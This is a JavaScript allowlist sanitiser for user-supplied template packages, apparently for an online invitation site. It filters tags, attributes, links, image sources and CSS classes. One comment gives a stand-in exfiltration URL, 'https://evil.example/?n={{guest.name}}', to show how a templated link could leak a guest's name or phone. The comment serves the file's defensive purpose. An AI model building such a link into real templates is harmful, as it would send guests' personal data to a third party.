/**
 * Client-side policy for template-package ASTs. The server already sanitised the package when it
 * was installed; this is the second wall (defence in depth): everything that is not on a closed
 * list is dropped here, whatever the payload says.
 */
import { safeHttpsUrl } from '../composables/safeUrl'

export const LIMITS = {
  depth: 24,
  nodes: 1500,
  text: 2000,
  classes: 8,
  carouselSlides: 24,
  /** JSON bytes of one section AST (the server caps the HTML at 64 KB). */
  astBytes: 200 * 1024,
  /** JSON bytes of every AST of a package together. */
  packageBytes: 1024 * 1024
}

/** Plain markup only. No script/style/iframe/object/embed/form/input/svg: they are not here. */
export const TAGS = new Set([
  'div', 'section', 'header', 'footer', 'nav', 'aside', 'article', 'span', 'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li', 'dl', 'dt', 'dd', 'a', 'img', 'figure', 'figcaption', 'blockquote', 'em', 'strong', 'b', 'i', 'u',
  's', 'small', 'sub', 'sup', 'mark', 'br', 'hr', 'time', 'address'
])
export const VOID_TAGS = new Set(['img', 'br', 'hr'])

const ROLES = new Set(['presentation', 'none', 'list', 'listitem', 'group', 'img', 'separator', 'note', 'region'])

/** Behaviour catalogue (BlockCatalog::BEHAVIORS). */
export const BEHAVIOR_VALUES = {
  'data-reveal': ['fade', 'rise', 'zoom', 'slide-left', 'slide-right'],
  'data-reveal-delay': ['0', '100', '200', '300', '400', '600', '800'],
  'data-parallax': ['subtle', 'soft', 'medium'],
  'data-carousel': ['snap'],
  'data-carousel-controls': ['arrows', 'dots', 'none'],
  'data-carousel-peek': ['on', 'off']
}
/** Parallax strengths: fraction of the distance to the viewport centre. */
export const PARALLAX = { subtle: 0.06, soft: 0.12, medium: 0.2 }

/**
 * Attributes whose value may come from a variable template. Never `href`, `src` or `srcset`: a variable there could
 * compose `https://evil.example/?n={{guest.name}}` and leak the guest's name or phone (W6-10, same as the server).
 */
export const VAR_ATTRS = new Set(['alt', 'aria-label', 'title'])

const noCredentials = href => (href && !/^https:\/\/[^/]*@/.test(href) ? href : null)

/** Hosts a guest should never be sent to from an invitation: localhost, IP literals, single-label and internal names. */
export function isPublicHost(hostname) {
  const host = String(hostname).toLowerCase().replace(/\.$/, '')
  if (!host || host.startsWith('[') || host.includes(':')) return false // IPv6 literal
  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host) || /^(0x[0-9a-f]+|\d+)$/.test(host)) return false // IPv4 literal, also hex/decimal forms
  if (!host.includes('.')) return false
  return !/(^|\.)(localhost|local|internal|intranet|lan|home|corp|arpa)$/.test(host)
}

const publicHttps = href => {
  if (!href) return null
  try {
    return isPublicHost(new URL(href).hostname) ? href : null
  } catch {
    return null
  }
}

const SECTION_ANCHORS = /^#(pkg-[a-z0-9-]{1,40}|cover|itinerary|locations|dress_code|padrinos|gallery|rsvp|music|closing|countdown|save_the_date)$/

/** Fragments of the page, https, mailto: and tel:. Anything else (javascript:, data:, http:, //host, paths) is null. */
export function safeLink(value) {
  if (typeof value !== 'string') return null
  const v = value.trim()
  if (SECTION_ANCHORS.test(v)) return v
  if (/^mailto:[A-Za-z0-9._%+-]{1,64}@[A-Za-z0-9.-]{1,120}$/.test(v)) return v
  if (/^tel:\+?[0-9]{5,15}$/.test(v)) return v
  return noCredentials(publicHttps(safeHttpsUrl(v)))
}

const ASSET_PATH = /^assets\/[a-z0-9][a-z0-9._/-]{0,120}$/

/** `assets/…` of the package resolved against its base URL, or null. */
export function packageAsset(value, base) {
  if (typeof value !== 'string' || !base) return null
  const v = value.trim()
  return ASSET_PATH.test(v) && !v.includes('..') && !v.includes('//') ? base + v : null
}

/** Images are package files only (`assets/…` resolved against the package base): no arbitrary https, no paths. */
export function safeSrc(value, base) {
  return packageAsset(value, base)
}

/** `srcset`: `assets/… 480w, assets/… 2x` candidates, each resolved against the package base. */
export function safeSrcset(value, base) {
  if (typeof value !== 'string' || value.length > 1200) return null
  const out = []
  for (const candidate of value.split(',').slice(0, 6)) {
    const m = candidate.trim().match(/^(\S+)(?:\s+(\d{2,4}w|\d(?:\.\d)?x))?$/)
    const url = m && packageAsset(m[1], base)
    if (!url) return null
    out.push(m[2] ? `${url} ${m[2]}` : url)
  }
  return out.length ? out.join(', ') : null
}

/** Classes must be the package's own (`pkg-*`): a Tailwind utility like `fixed inset-0` must never be reachable. */
export function safeClass(value) {
  if (typeof value !== 'string') return null
  const tokens = value.split(/\s+/).filter(Boolean)
  if (!tokens.length || tokens.length > LIMITS.classes) return null
  return tokens.every(t => /^pkg-[a-z0-9_-]{1,60}$/.test(t)) ? tokens.join(' ') : null
}

const int = (v, min, max) => (/^\d{1,4}$/.test(String(v)) && +v >= min && +v <= max ? String(+v) : null)

/** Sum of JSON bytes of an AST, cached per object (the renderer runs on every update). */
const sizes = new WeakMap()
export function astBytes(ast) {
  if (ast === null || typeof ast !== 'object') return 0
  if (!sizes.has(ast)) {
    try {
      sizes.set(ast, JSON.stringify(ast).length)
    } catch {
      sizes.set(ast, Infinity)
    }
  }
  return sizes.get(ast)
}

/**
 * Validates one attribute. Returns the value to render, or undefined to drop the attribute.
 * @param {string} tag
 * @param {string} name
 * @param {unknown} value already resolved to a string
 */
export function cleanAttr(tag, name, value, base) {
  if (typeof value !== 'string' && typeof value !== 'number') return undefined
  const v = String(value)
  switch (name) {
    case 'class': return safeClass(v) ?? undefined
    case 'id':
    case 'aria-labelledby': return /^pkg-[a-z0-9-]{1,40}$/.test(v) ? v : undefined
    case 'title':
    case 'aria-label': return v.slice(0, 200)
    case 'aria-hidden': return v === 'true' || v === 'false' ? v : undefined
    case 'role': return ROLES.has(v) ? v : undefined
    case 'lang': return /^[a-z]{2}(-[A-Z]{2})?$/.test(v) ? v : undefined
    case 'dir': return v === 'ltr' || v === 'rtl' ? v : undefined
    default:
  }
  if (Object.hasOwn(BEHAVIOR_VALUES, name)) return BEHAVIOR_VALUES[name].includes(v) ? v : undefined
  if (tag === 'a' && name === 'href') return safeLink(v) ?? undefined
  if (tag === 'a' && name === 'target') return v === '_blank' ? '_blank' : undefined
  if (tag === 'img') {
    if (name === 'src') return safeSrc(v, base) ?? undefined
    if (name === 'srcset') return safeSrcset(v, base) ?? undefined
    if (name === 'sizes') return /^[a-z0-9 ().,:%vwh-]{1,200}$/i.test(v) && !/url/i.test(v) ? v : undefined
    if (name === 'alt') return v.slice(0, 200)
    if (name === 'width' || name === 'height') return int(v, 1, 4096) ?? undefined
    if (name === 'loading') return v === 'eager' || v === 'lazy' ? v : undefined
    if (name === 'decoding') return ['async', 'sync', 'auto'].includes(v) ? v : undefined
    if (name === 'fetchpriority') return ['high', 'low', 'auto'].includes(v) ? v : undefined
  }
  if (tag === 'time' && name === 'datetime') return /^[\d\-T:+.Z ]{4,40}$/.test(v) ? v : undefined
  return undefined
}
